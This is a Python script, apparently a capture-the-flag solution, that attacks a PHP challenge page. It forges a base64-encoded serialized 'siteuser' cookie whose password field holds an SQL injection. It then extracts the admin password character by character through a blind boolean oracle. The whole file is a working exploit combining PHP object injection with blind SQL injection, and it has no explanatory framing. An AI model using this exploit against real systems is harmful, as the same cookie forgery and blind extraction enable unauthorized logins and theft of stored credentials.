import requests
import base64
import string

def check_password(password):
    php_serialize = "O:8:\"siteuser\":2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:" + str(len(password) + 28) + ":\"' or binary password like '" + password + "%\";}"
    user_info = base64.b64encode(php_serialize.encode("utf-8")).decode("utf-8")

    url = "https://shell1.production.cognitivectf.com/problem/30568/index.php"
    params = {"file": "admin"}
    headers = {'Cookie': "user_info=" + user_info}
    response = requests.get(url, params=params, headers=headers)
    if "You are not admin!" in response.text:
        return False
    else:
        return True

def main():
    flag = ""
    while True:
        for ch in string.printable:
            if ch == "%" or ch == "_" or ch == "\\":
                ch = "\\" + ch
            test_flag = flag + ch
            if check_password(test_flag):
                flag = test_flag
                print(flag)
                break

if __name__ == "__main__":
    main()